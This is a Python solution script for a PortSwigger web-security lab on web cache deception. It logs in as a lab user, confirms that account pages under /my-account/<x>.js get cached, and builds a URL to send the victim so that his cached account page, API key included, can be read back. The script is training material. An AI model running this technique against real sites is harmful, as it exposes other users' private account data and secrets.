"""
Lab 1: Exploiting path mapping for web cache deception
https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-mapping
Difficulty: Apprentice

📝 The origin's routing maps any /my-account/<anything> path back to the
real account page, and the cache has a static-extension rule for .js.
Request /my-account/wcd.js as carlos's victim traffic — origin serves his
real account page (containing his API key), cache stores it under that
exact URL because of the .js extension.
"""

from utils import get_session, cache_status, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
WIENER = {"username": "wiener", "password": "peter"}


def run():
    s = get_session()
    s.post(f"{TARGET}/login", data=WIENER)

    note("Step 1: confirm the origin maps /my-account/abc.js back to the")
    note("real account page (ignoring the extra segment).")
    r = s.get(f"{TARGET}/my-account/abc.js")
    log(f"Status: {r.status_code}, X-Cache: {cache_status(r)!r}")
    log(f"Contains account info: {'wiener' in r.text or 'API' in r.text}")

    note("Step 2: confirm it gets cached — resend, expect X-Cache: hit.")
    r2 = s.get(f"{TARGET}/my-account/abc.js")
    log(f"Second request X-Cache: {cache_status(r2)!r}")

    note("Step 3: the exploit URL to deliver to carlos — his OWN account")
    note("page (with HIS API key) gets cached under this exact path.")
    exploit_url = f"{TARGET}/my-account/wcd.js"
    log(f"Deliver this URL to carlos: {exploit_url}")

    note("Step 4: after carlos visits it, request the SAME URL yourself")
    note("(unauthenticated / as wiener) — his cached account page, API key")
    note("included, should come back.")
    r3 = s.get(exploit_url)
    log(f"Retrieved (check for carlos's API key manually): {r3.text[:300]}")


if __name__ == "__main__":
    run()
